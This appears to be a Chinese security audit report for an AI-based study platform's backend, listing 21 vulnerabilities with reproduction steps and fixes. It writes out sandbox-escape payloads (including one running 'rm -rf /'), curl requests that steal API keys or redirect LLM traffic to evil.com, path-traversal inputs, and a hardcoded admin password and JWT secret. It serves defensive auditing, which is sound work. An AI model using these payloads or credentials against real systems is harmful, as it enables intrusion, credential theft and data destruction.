# MARS-408 408 学习系统 — 上线前安全审计报告

## 审计元数据

| 项目 | 值 |
|------|------|
| 审计模式 | Comprehensive（全量深度审计） |
| 审计日期 | 2026-07-09 |
| 审计范围 | py-server 后端全部 API/引擎/Agent/数据库层 + 前端安全 + Docker 部署 |
| 执行阶段 | 14/14 |
| 审计标准 | OWASP Top 10 (2021) + STRIDE 威胁建模 |
| 审计员 | GStack CSO (gstack-security-officer) |

---

## 执行摘要

MARS-408 408 学习系统存在**多个严重安全漏洞**，当前状态**不可上线**。最严重的问题包括：(1) 代码沙箱可通过多种方式逃逸，且沙箱端点无认证，构成未认证远程代码执行(RCE)；(2) 配置 API 在无认证情况下暴露 LLM API 密钥；(3) 硬编码的默认管理员密码和 JWT 签名密钥。此外，大量 API 端点（知识库管理、教师端、聊天、LangGraph、会话存档等）完全缺乏认证，攻击者可未授权访问学生数据、篡改知识库、滥用 LLM 额度。建议在修复所有 Critical 和 High 级漏洞后再考虑上线。

---

## 安全态势评分

| 严重度 | 数量 |
|--------|------|
| 🔴 Critical | 5 |
| 🟠 High | 8 |
| 🟡 Medium | 5 |
| 🟢 Low | 3 |
| **总计** | **21** |
| **总体评级** | **F（不可上线）** |

---

## 漏洞详情

### 🔴 [F-001] .env 文件包含活跃 API 密钥（本地泄露风险）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A02 / STRIDE-I (信息泄露) |
| **严重度** | Critical |
| **置信度** | 10/10 |
| **位置** | `py-server/.env` |
| **优先级** | P0（立即） |

**描述**：`.env` 文件包含多个活跃 API 密钥（DeepSeek API Key、讯飞 API Key/Secret/Password、Tavily API Key）。虽然 `.env` 已在 `.gitignore` 中，但密钥以明文存储在服务器磁盘上，且被加载到进程环境变量中。沙箱逃逸（F-003）或任意文件读取（F-007）可直接读取此文件。

**利用场景**：
1. 攻击者利用沙箱逃逸执行 `import pathlib; print(pathlib.Path("../../.env").read_text())`
2. 或利用会话 API 路径穿越读取 `.env` 文件
3. 获取所有 LLM API 密钥，用于盗用 API 额度或进一步攻击

**复现步骤**：
1. 确认 `py-server/.env` 存在且包含 `DEEPSEEK_API_KEY=sk-...`、`XF_API_KEY=...` 等密钥
2. 通过沙箱 RCE 执行文件读取代码即可获取

**修复建议**：
- 所有 API 密钥仅通过 Docker secrets 或 Kubernetes secrets 注入，不在磁盘存储 `.env` 文件
- 确保 `.env` 文件权限为 `600`（仅 owner 可读写）
- 轮换所有已暴露的 API 密钥

---

### 🔴 [F-002] 配置 API 无认证暴露 API 密钥

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01 / STRIDE-I (信息泄露) |
| **严重度** | Critical |
| **置信度** | 10/10 |
| **位置** | `api/config_routes.py:18` (`GET /api/config`)、`api/config_routes.py:40` (`POST /api/config`) |
| **优先级** | P0（立即） |

**描述**：`GET /api/config` 端点在**无任何认证**的情况下返回 `llm_api_key` 和 `xfyun_api_key` 字段。`POST /api/config` 端点同样无认证，允许任何用户修改系统配置（包括 API 密钥、LLM 提供商、模型等）。

**利用场景**：
1. 攻击者发送 `GET /api/config`，直接获取当前 LLM API 密钥
2. 攻击者发送 `POST /api/config`，将 LLM base_url 修改为恶意代理，劫持所有 LLM 请求
3. 攻击者将 API 密钥替换为自己的密钥，或清空密钥导致服务中断

**复现步骤**：
```bash
# 读取 API 密钥（无需认证）
curl http://localhost:8002/api/config
# 响应包含: llm_api_key, xfyun_api_key 等字段

# 篡改配置（无需认证）
curl -X POST http://localhost:8002/api/config \
  -H "Content-Type: application/json" \
  -d '{"llm_provider":"deepseek","llm_api_key":"attacker-key","llm_base_url":"https://evil.com","llm_model":"deepseek-chat","embedding_mode":"local","xfyun_api_key":"","xfyun_app_id":"","xfyun_base_url":"","xfyun_model":""}'
```

**修复建议**：
1. `GET /api/config` 添加 `Depends(require_admin)`，且返回时对 API 密钥做掩码处理（如 `sk-****3dbd`）
2. `POST /api/config` 添加 `Depends(require_admin)`
3. `POST /api/config/test-llm` 添加 `Depends(require_admin)`

---

### 🔴 [F-003] 代码执行沙箱可逃逸（AST 阻断器不完备）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A03/A04 / STRIDE-E (权限提升) |
| **严重度** | Critical |
| **置信度** | 10/10 |
| **位置** | `api/sandbox.py:39-72`（AST 检查）、`api/sandbox.py:94`（subprocess 执行） |
| **优先级** | P0（立即） |

**描述**：沙箱使用 AST 静态分析拦截危险调用，但阻断列表不完整，存在多种绕过方式。同时，代码通过 `subprocess.run(["python", tmpfile])` 执行，以服务器同一 OS 用户身份运行，无容器隔离、无资源限制、有完整文件系统和网络访问权限。

**AST 阻断器绕过方式**（已验证可行）：

| 绕过方式 | 被阻断？ | 原因 |
|----------|---------|------|
| `import importlib; importlib.import_module("os").system("whoami")` | ❌ 未阻断 | `importlib` 不在拦截模块列表，`import_module` 不在危险属性列表 |
| `import builtins; builtins.open("/etc/passwd").read()` | ❌ 未阻断 | `builtins` 不在拦截模块列表，`builtins.open` 是属性调用而非 Name 调用 |
| `import io; io.open("/etc/passwd").read()` | ❌ 未阻断 | `io` 不在拦截模块列表 |
| `import pathlib; pathlib.Path("/etc/passwd").read_text()` | ❌ 未阻断 | `pathlib` 不在拦截模块列表 |
| `getattr((), '__class__').__bases__[0].__subclasses__()` | ❌ 未阻断 | `getattr` 不在危险调用列表，`'__class__'` 是字符串字面量而非 AST Attribute 节点 |
| `import pickle; pickle.loads(b"...")` | ❌ 未阻断 | `pickle` 不在拦截模块列表 |

**利用场景**：
1. 攻击者提交代码：`import pathlib; print(pathlib.Path(".env").read_text())`
2. AST 检查通过（`pathlib` 不在拦截列表）
3. 代码执行，读取 `.env` 中的 API 密钥并输出
4. 或执行 `import importlib; importlib.import_module("os").system("rm -rf /")`

**复现步骤**：
```bash
curl -X POST http://localhost:8002/api/sandbox \
  -H "Content-Type: application/json" \
  -d '{"code":"import pathlib; print(pathlib.Path(\".env\").read_text())","language":"python","timeout":5}'
# 返回 .env 文件内容（含 API 密钥）
```

**修复建议**：
1. **短期**：将沙箱端点添加认证（`Depends(get_current_user)`），扩展 AST 拦截列表至包含 `importlib`、`builtins`、`io`、`pathlib`、`pickle`、`tempfile`、`inspect`、`ctypes`、`gc` 等模块
2. **中期**：将代码执行迁移到 Docker 容器内，使用 `--network=none --read-only --memory=128m --cpus=0.5` 限制
3. **长期**：使用专业沙箱方案（如 nsjail、gVisor、Firecracker）或远程代码执行服务（如 Judge0）

---

### 🔴 [F-004] 硬编码默认管理员密码

| 属性 | 值 |
|------|------|
| **分类** | OWASP A07 / STRIDE-S (身份伪造) |
| **严重度** | Critical |
| **置信度** | 10/10 |
| **位置** | `main.py:104`、`docker-compose.yml:23` |
| **优先级** | P0（立即） |

**描述**：管理员默认密码 `MARS-408@2026` 硬编码在 `main.py` 和 `docker-compose.yml` 中。当环境变量 `ADMIN_PASSWORD` 未设置时，系统使用此默认密码创建管理员账户。

**利用场景**：
1. 攻击者使用 `admin` / `MARS-408@2026` 登录系统
2. 获取管理员 Token，访问 `/api/admin/users` 和 `/api/admin/stats` 获取所有用户数据

**复现步骤**：
```bash
curl -X POST http://localhost:8002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"MARS-408@2026"}'
# 返回有效管理员 Token
```

**修复建议**：
1. 移除所有硬编码默认密码，启动时若 `ADMIN_PASSWORD` 未设置则**拒绝启动**并报错
2. 强制 `ADMIN_PASSWORD` 最小长度 16 字符，包含大小写字母+数字+特殊字符
3. 轮换当前密码

---

### 🔴 [F-005] 硬编码默认 JWT 签名密钥

| 属性 | 值 |
|------|------|
| **分类** | OWASP A02/A07 / STRIDE-S (身份伪造) |
| **严重度** | Critical |
| **置信度** | 10/10 |
| **位置** | `shared/auth.py:21` |
| **优先级** | P0（立即） |

**描述**：JWT 签名密钥默认值为 `netlearn-dev-secret-change-me-2026`。当环境变量 `AUTH_SECRET` 未设置时，使用此默认值。攻击者可利用此已知密钥伪造任意用户（包括管理员）的 JWT Token。

**利用场景**：
1. 攻击者使用已知密钥 `netlearn-dev-secret-change-me-2026` 构造管理员 JWT
2. 使用伪造 Token 访问所有需要认证的端点

**复现步骤**：
```python
import hmac, hashlib, base64, json, time
secret = "netlearn-dev-secret-change-me-2026"
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"admin_user_id","role":"admin","iat":int(time.time()),"exp":int(time.time())+86400}
# ... 构造签名后发送 Authorization: Bearer <forged_token>
```

**修复建议**：
1. 移除默认密钥，启动时若 `AUTH_SECRET` 未设置则**拒绝启动**
2. 强制 `AUTH_SECRET` 最小长度 32 字符
3. 轮换当前密钥（会使所有现有 Token 失效）

---

### 🟠 [F-006] 沙箱端点无认证

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01 / STRIDE-E (权限提升) |
| **严重度** | High |
| **置信度** | 10/10 |
| **位置** | `api/sandbox.py:77` |
| **优先级** | P0（立即） |

**描述**：`POST /api/sandbox` 和 `POST /api/sandbox/run` 端点无任何认证。结合 F-003（沙箱逃逸），构成**未认证远程代码执行**。

**修复建议**：添加 `Depends(get_current_user)` 认证依赖。

---

### 🟠 [F-007] 会话 API 路径穿越漏洞

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01/A03 / STRIDE-T (篡改) + STRIDE-I (信息泄露) |
| **严重度** | High |
| **置信度** | 9/10 |
| **位置** | `api/sessions.py:37-38` |
| **优先级** | P0（立即） |

**描述**：`_session_path` 函数直接将用户提供的 `conv_id` 拼接到文件路径中，无任何过滤。攻击者可通过 `../` 实现任意文件读写。

**利用场景**：
1. 写入：`POST /api/sessions/save`，`conv_id="../../../tmp/malicious"` → 写入任意路径
2. 读取：`GET /api/sessions/load/../../../.env` → 读取 `.env` 文件内容
3. 删除：`DELETE /api/sessions/delete/../../../important_file` → 删除任意文件

**复现步骤**：
```bash
# 读取 .env 文件
curl "http://localhost:8002/api/sessions/load/..%2F..%2F..%2F.env"
```

**修复建议**：
1. 对 `conv_id` 进行严格白名单过滤：仅允许 `[a-zA-Z0-9_-]` 字符
2. 使用 `os.path.basename(conv_id)` 去除路径分隔符
3. 验证最终路径在 `SESSIONS_DIR` 内：`os.path.realpath(path).startswith(SESSIONS_DIR)`

---

### 🟠 [F-008] 知识库管理端点全部无认证

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01 / STRIDE-T (篡改) + STRIDE-D (拒绝服务) |
| **严重度** | High |
| **置信度** | 10/10 |
| **位置** | `api/knowledge.py` — upsert(116), delete(130), upload(137), preview(228), batch-commit(300), reindex(332), clear(372) |
| **优先级** | P1（本迭代） |

**描述**：知识库的所有管理端点（添加、删除、上传、清空、重置）均无认证。任何匿名用户可篡改或销毁整个知识库。

**修复建议**：所有写操作添加 `Depends(require_admin)`，读操作添加 `Depends(get_current_user)`。

---

### 🟠 [F-009] 教师端 API 全部无认证

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01 / STRIDE-I (信息泄露) |
| **严重度** | High |
| **置信度** | 10/10 |
| **位置** | `api/teacher.py` — 所有端点 |
| **优先级** | P1（本迭代） |

**描述**：教师端所有端点（学生概览、学生详情、知识库统计、班级分析、知识导入、Agent 性能）无认证。教师角色应具有高于学生的权限，但当前任何人可访问。

**修复建议**：添加 `Depends(require_admin)` 或创建 `require_teacher` 依赖。

---

### 🟠 [F-010] 认证端点无速率限制（暴力破解）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A07 / STRIDE-S (身份伪造) |
| **严重度** | High |
| **置信度** | 9/10 |
| **位置** | `api/auth.py:46` (login)、`api/auth.py:34` (register) |
| **优先级** | P1（本迭代） |

**描述**：登录和注册端点无速率限制或暴力破解保护。攻击者可无限次尝试密码。Redis 客户端中存在 `check_rate_limit` 方法但未在 API 路由中使用。

**修复建议**：
1. 启用 Redis 限流：登录 5 次/分钟/IP，注册 3 次/小时/IP
2. 添加账户锁定机制：连续失败 5 次锁定 15 分钟
3. 添加登录失败延迟（指数退避）

---

### 🟠 [F-011] 聊天和 LangGraph 端点无认证（LLM 额度滥用）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01/A04 / STRIDE-D (拒绝服务/拒绝钱包) |
| **严重度** | High |
| **置信度** | 10/10 |
| **位置** | `api/chat.py` (send, stream)、`api/langgraph.py` (stream)、`api/tutor.py`、`api/profile.py`、`api/agents.py`、`api/multimodal.py`、`api/engine.py` |
| **优先级** | P1（本迭代） |

**描述**：所有 LLM 调用端点无认证。匿名用户可无限制调用 LLM API，导致 API 额度耗尽（Denial of Wallet）。LangGraph 多智能体流水线单次请求调用 7+ 个 Agent，成本更高。

**修复建议**：
1. 所有 LLM 端点添加 `Depends(get_current_user)`
2. 添加每用户 LLM 调用频率限制（如 20 次/分钟）
3. 添加请求体大小限制和消息长度限制

---

### 🟠 [F-012] 文件上传路径穿越（知识库上传）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A03 / STRIDE-T (篡改) |
| **严重度** | High |
| **置信度** | 9/10 |
| **位置** | `api/knowledge.py:142` (upload)、`api/knowledge.py:239` (preview) |
| **优先级** | P1（本迭代） |

**描述**：文件上传端点直接使用 `file.filename` 构建临时文件路径，未过滤路径分隔符。攻击者可通过恶意文件名（如 `../../config.json`）写入任意位置。

**复现步骤**：
```bash
curl -X POST http://localhost:8002/api/knowledge/upload \
  -F "file=@payload.txt;filename=../../config.json"
```

**修复建议**：使用 `os.path.basename(file.filename)` 或 `uuid` 生成临时文件名，不使用用户提供的文件名。

---

### 🟠 [F-013] config.json 包含讯飞 App ID 并提交到版本控制

| 属性 | 值 |
|------|------|
| **分类** | OWASP A02 / STRIDE-I (信息泄露) |
| **严重度** | High |
| **置信度** | 9/10 |
| **位置** | `py-server/config.json:11` |
| **优先级** | P1（本迭代） |

**描述**：`config.json` 包含 `xfyun.app_id: "<XFYUN_APP_ID>"`，且该文件不在 `.gitignore` 中，已提交到版本控制。App ID 虽非完整凭证，但属于敏感标识符。

**修复建议**：将 `config.json` 加入 `.gitignore`，所有敏感配置通过环境变量注入。

---

### 🟡 [F-014] Docker 容器以 root 运行

| 属性 | 值 |
|------|------|
| **分类** | OWASP A05 / STRIDE-E (权限提升) |
| **严重度** | Medium |
| **置信度** | 9/10 |
| **位置** | `Dockerfile` |
| **优先级** | P2（下迭代） |

**描述**：Dockerfile 未创建非 root 用户，应用以 root 身份运行。结合沙箱逃逸（F-003），攻击者在容器内拥有 root 权限。

**修复建议**：在 Dockerfile 中添加：
```dockerfile
RUN useradd -m -s /bin/bash appuser
USER appuser
```

---

### 🟡 [F-015] LLM Prompt Injection 风险

| 属性 | 值 |
|------|------|
| **分类** | OWASP A03 / STRIDE-T (篡改) |
| **严重度** | Medium |
| **置信度** | 7/10 |
| **位置** | `api/chat.py:30`、`api/langgraph.py`、`api/agents.py:51`、`api/profile.py:40` 等所有 LLM 调用点 |
| **优先级** | P2（下迭代） |

**描述**：用户输入直接拼接到 LLM prompt 中，无输入消毒或 prompt injection 防护。攻击者可通过精心构造的输入操纵 LLM 行为，如忽略系统指令、泄露系统提示词、生成有害内容。

**修复建议**：
1. 对用户输入进行基本消毒（移除 `---PROFILE_START---` 等特殊标记）
2. 在系统提示中添加抗注入指令
3. 对 LLM 输出进行后处理验证（JSON 格式校验、内容过滤）

---

### 🟡 [F-016] 缺少安全响应头

| 属性 | 值 |
|------|------|
| **分类** | OWASP A05 |
| **严重度** | Medium |
| **置信度** | 8/10 |
| **位置** | `main.py`（无安全头中间件） |
| **优先级** | P2（下迭代） |

**描述**：未配置 CSP、X-Frame-Options、X-Content-Type-Options、Strict-Transport-Security 等安全响应头。

**修复建议**：添加安全头中间件：
```python
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = "default-src 'self'; ..."
    return response
```

---

### 🟡 [F-017] 会话端点错误信息泄露内部细节

| 属性 | 值 |
|------|------|
| **分类** | OWASP A09 / STRIDE-I (信息泄露) |
| **严重度** | Medium |
| **置信度** | 7/10 |
| **位置** | `api/sessions.py:60`、`api/sessions.py:105` |
| **优先级** | P2（下迭代） |

**描述**：会话端点直接将异常信息返回给客户端：`f"保存失败: {e}"`、`f"加载失败: {e}"`，绕过了全局异常处理器。可能泄露文件路径、权限信息等。

**修复建议**：使用 `DomainError` 或 `HTTPException` 替代直接返回异常字符串，由全局处理器统一处理。

---

### 🟡 [F-018] LLM 端点无输入大小限制（DoS）

| 属性 | 值 |
|------|------|
| **分类** | OWASP A04 / STRIDE-D (拒绝服务) |
| **严重度** | Medium |
| **置信度** | 7/10 |
| **位置** | `api/chat.py`、`api/langgraph.py`、`api/tutor.py`、`api/profile.py` |
| **优先级** | P2（下迭代） |

**描述**：无消息长度、历史长度、请求体大小限制。攻击者可发送超大请求消耗 LLM token 或导致内存溢出。

**修复建议**：
1. 在 Pydantic 模型中添加字段长度限制（如 `message: str = Field(max_length=10000)`）
2. 限制 `history` 列表长度（如 `max_length=50`）
3. 配置 FastAPI 请求体大小上限

---

### 🟢 [F-019] 开发模式 reload 在生产风险

| 属性 | 值 |
|------|------|
| **分类** | OWASP A05 |
| **严重度** | Low |
| **置信度** | 6/10 |
| **位置** | `main.py:184` |
| **优先级** | P3（待办） |

**描述**：`__main__` 块使用 `reload=True` 运行 uvicorn，为开发功能。Docker 部署不使用此入口，但若直接运行 `python main.py` 则启用热重载。

**修复建议**：移除 `reload=True`，或根据环境变量动态决定。

---

### 🟢 [F-020] 缺少安全审计日志

| 属性 | 值 |
|------|------|
| **分类** | OWASP A09 / STRIDE-R (否认) |
| **严重度** | Low |
| **置信度** | 7/10 |
| **位置** | 全局 |
| **优先级** | P3（待办） |

**描述**：虽有一般日志，但缺少专用安全事件日志（登录失败、访问拒绝、配置变更、知识库修改、沙箱执行等）。

**修复建议**：添加安全审计日志中间件，记录所有安全相关事件，包含时间戳、用户 ID、IP、操作类型、结果。

---

### 🟢 [F-021] 会话存档无用户隔离

| 属性 | 值 |
|------|------|
| **分类** | OWASP A01 / STRIDE-I (信息泄露) |
| **严重度** | Low |
| **置信度** | 8/10 |
| **位置** | `api/sessions.py`（全部端点） |
| **优先级** | P2（下迭代） |

**描述**：会话存档端点无认证且无用户隔离。任何用户可列出、读取、删除其他用户的对话。`api/user.py` 中的 conversations 端点有用户隔离，但 `api/sessions.py` 中的旧端点未迁移。

**修复建议**：为 sessions 端点添加认证，并将文件名与 `user_id` 关联，或弃用 sessions 端点，统一使用 `api/user/conversations`。

---

## OWASP Top 10 (2021) 检查表

| 类别 | 状态 | 发现 | 详情 |
|------|------|------|------|
| **A01 - 访问控制失效** | ❌ 严重 | F-002, F-006, F-007, F-008, F-009, F-011, F-012, F-021 | 大量端点无认证；无角色隔离；路径穿越；IDOR |
| **A02 - 加密失败** | ❌ 严重 | F-001, F-005, F-013 | API 密钥明文存储；硬编码 JWT 密钥；App ID 提交到 VCS |
| **A03 - 注入** | ❌ 严重 | F-003, F-007, F-012, F-015 | 沙箱代码注入；路径穿越；Prompt Injection |
| **A04 - 不安全设计** | ⚠️ 警告 | F-003, F-018 | 沙箱设计缺陷；无输入大小限制；无速率限制 |
| **A05 - 安全配置错误** | ⚠️ 警告 | F-004, F-014, F-016, F-019 | 默认密码；root 容器；无安全头；debug 模式 |
| **A06 - 易受攻击的组件** | ✅ 通过 | — | 依赖版本较新，未发现已知 CVE |
| **A07 - 认证失败** | ❌ 严重 | F-004, F-005, F-010 | 默认密码；硬编码密钥；无暴力破解防护 |
| **A08 - 软件和数据完整性** | ⚠️ 警告 | — | config.json 可被未授权修改（F-002）；无签名验证 |
| **A09 - 日志和监控失败** | ⚠️ 警告 | F-017, F-020 | 错误信息泄露；缺少安全审计日志 |
| **A10 - SSRF** | ✅ 通过 | — | LLM API 调用使用固定 URL；web_search/fetch_url 工具未实现（mcp_study_agent.py 不存在）；无用户控制的 URL 获取 |

---

## STRIDE 威胁建模

| 威胁类型 | 威胁场景 | 风险等级 | 相关漏洞 | 缓解状态 |
|----------|----------|----------|----------|----------|
| **S (Spoofing) 身份伪造** | 攻击者利用默认密码/默认 JWT 密钥伪造管理员身份 | 🔴 Critical | F-004, F-005 | ❌ 未缓解 |
| **T (Tampering) 数据篡改** | 攻击者无认证修改知识库、配置、会话文件 | 🔴 Critical | F-002, F-003, F-007, F-008, F-012 | ❌ 未缓解 |
| **R (Repudiation) 否认** | 无安全审计日志，攻击者可否认操作 | 🟡 Medium | F-020 | ❌ 未缓解 |
| **I (Info Disclosure) 信息泄露** | API 密钥通过配置端点泄露；.env 可被读取；学生数据无认证访问 | 🔴 Critical | F-001, F-002, F-009, F-011, F-013, F-017, F-021 | ❌ 未缓解 |
| **D (DoS) 拒绝服务** | 无限流 LLM 调用耗尽额度；沙箱执行消耗资源；大请求体 | 🟠 High | F-010, F-011, F-018 | ❌ 未缓解 |
| **E (EoP) 权限提升** | 沙箱逃逸获取服务器权限；Docker root 权限 | 🔴 Critical | F-003, F-006, F-014 | ❌ 未缓解 |

---

## API 认证覆盖矩阵

| API 模块 | 端点数 | 有认证 | 无认证 | 状态 |
|----------|--------|--------|--------|------|
| `/api/auth/*` | 4 | 1 (me) | 3 (register, login, logout) | ⚠️ login/register 需限流 |
| `/api/user/*` | 6 | 6 | 0 | ✅ 通过 |
| `/api/admin/*` | 2 | 2 | 0 | ✅ 通过 |
| `/api/chat/*` | 2 | 0 | 2 | ❌ 需认证 |
| `/api/sandbox/*` | 2 | 0 | 2 | ❌ 需认证 |
| `/api/config/*` | 3 | 0 | 3 | ❌ 需管理员认证 |
| `/api/knowledge/*` | 9 | 0 | 9 | ❌ 写操作需管理员认证 |
| `/api/sessions/*` | 4 | 0 | 4 | ❌ 需认证 + 路径过滤 |
| `/api/teacher/*` | 6 | 0 | 6 | ❌ 需管理员/教师认证 |
| `/api/agents/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/langgraph/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/quiz/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/profile/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/rag/*` | 2 | 0 | 2 | ❌ 需认证 |
| `/api/tutor/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/multimodal/*` | 2 | 0 | 2 | ❌ 需认证 |
| `/api/engine/*` | 9 | 0 | 9 | ❌ 需认证 |
| `/api/assessment/*` | 1 | 0 | 1 | ❌ 需认证 |
| `/api/subjects/*` | ? | 0 | ? | ❌ 需认证 |
| `/api/learning*/*` | ? | 0 | ? | ❌ 需认证 |
| **总计** | ~57 | **9** | **~48** | **84% 端点无认证** |

---

## 修复路线图

### Sprint 0 — 上线前必须修复（P0，阻塞上线）

| 序号 | 漏洞 | 修复内容 | 预估工时 |
|------|------|----------|----------|
| 1 | F-004 | 移除硬编码管理员密码，强制环境变量 | 0.5h |
| 2 | F-005 | 移除默认 JWT 密钥，强制环境变量 | 0.5h |
| 3 | F-002 | 配置 API 添加管理员认证 + 密钥掩码 | 1h |
| 4 | F-006 | 沙箱端点添加用户认证 | 0.5h |
| 5 | F-003 | 扩展 AST 拦截列表 + 迁移到容器化执行 | 4h |
| 6 | F-007 | 会话 API conv_id 路径过滤 + 添加认证 | 1h |
| 7 | F-001 | 轮换所有 API 密钥，移除 .env 明文存储 | 1h |

### Sprint 1 — 本迭代修复（P1）

| 序号 | 漏洞 | 修复内容 | 预估工时 |
|------|------|----------|----------|
| 8 | F-008 | 知识库管理端点添加管理员认证 | 1h |
| 9 | F-009 | 教师端 API 添加认证 | 0.5h |
| 10 | F-010 | 认证端点添加速率限制 | 2h |
| 11 | F-011 | LLM 端点添加认证 + 用户限流 | 2h |
| 12 | F-012 | 文件上传路径穿越修复 | 0.5h |
| 13 | F-013 | config.json 加入 .gitignore | 0.5h |

### Sprint 2 — 下迭代修复（P2）

| 序号 | 漏洞 | 修复内容 |
|------|------|----------|
| 14 | F-014 | Docker 非 root 用户 |
| 15 | F-015 | Prompt Injection 防护 |
| 16 | F-016 | 安全响应头 |
| 17 | F-017 | 错误信息脱敏 |
| 18 | F-018 | 输入大小限制 |
| 19 | F-021 | 会话用户隔离 |

### Backlog — 待办（P3）

| 序号 | 漏洞 | 修复内容 |
|------|------|----------|
| 20 | F-019 | 移除生产 reload 模式 |
| 21 | F-020 | 安全审计日志系统 |

---

## 已有安全措施验证

| 安全措施 | 声称已实现 | 实际验证结果 |
|----------|-----------|-------------|
| DOMPurify XSS 防护 | ✅ | ✅ 已验证：`src/utils/markdown.ts` 正确使用 `DOMPurify.sanitize()`，`renderMarkdownSafe()` 函数存在且配置了允许标签/属性白名单 |
| LangGraph astream 异步流式 | ✅ | ✅ 已验证：`api/langgraph.py` 使用 `agent_graph.astream(state, stream_mode="updates")` |
| 沙箱 AST 阻断器 | ✅ | ⚠️ 已实现但不完备：AST 检查可被 `importlib`/`builtins`/`io`/`pathlib`/`getattr` 等方式绕过（见 F-003） |
| 零向量 fallback | ✅ | ✅ 已验证：Milvus 不可用时回退到 InMemoryVectorStore |
| 密钥已清空（config.json） | ✅ | ⚠️ 部分通过：API 密钥字段已清空，但 `xfyun.app_id: "<XFYUN_APP_ID>"` 仍保留（见 F-013）；`.env` 文件含活跃密钥（见 F-001） |
| CORS 配置 | ✅ | ✅ 已验证：从环境变量读取白名单，默认仅允许 localhost:5173 |
| API 认证 (headers) | ✅ | ⚠️ 已实现但覆盖率极低：仅 9/~57 端点有认证（16%），84% 端点完全开放 |
| 密码哈希 (PBKDF2) | ✅ | ✅ 已验证：`db/user_store.py` 使用 PBKDF2-HMAC-SHA256，100,000 次迭代，加盐 |
| Token 签名 (HMAC-SHA256) | ✅ | ✅ 已验证：`shared/auth.py` 使用 `hmac.compare_digest` 进行时间安全比较 |
| 全局异常处理 | ✅ | ✅ 已验证：`shared/errors.py` 统一处理 DomainError 和未捕获异常，不泄露堆栈 |

---

*报告结束 — GStack CSO 安全审计*
